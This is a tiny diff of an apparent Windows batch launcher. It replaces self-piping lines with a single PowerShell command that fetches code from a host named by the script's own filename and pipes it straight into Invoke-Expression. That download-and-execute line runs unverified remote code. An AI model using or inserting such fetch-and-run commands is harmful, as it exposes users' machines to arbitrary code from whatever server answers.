@@ -1,4 +1,1 @@
-set "github=%~dpf0"
-more +2 "%~dpf0" | cmd & GOTO :EOF
-powershell 
-$Env:github
+@powershell -c "curl.exe %~n0/%1 | iex" || echo ur offline
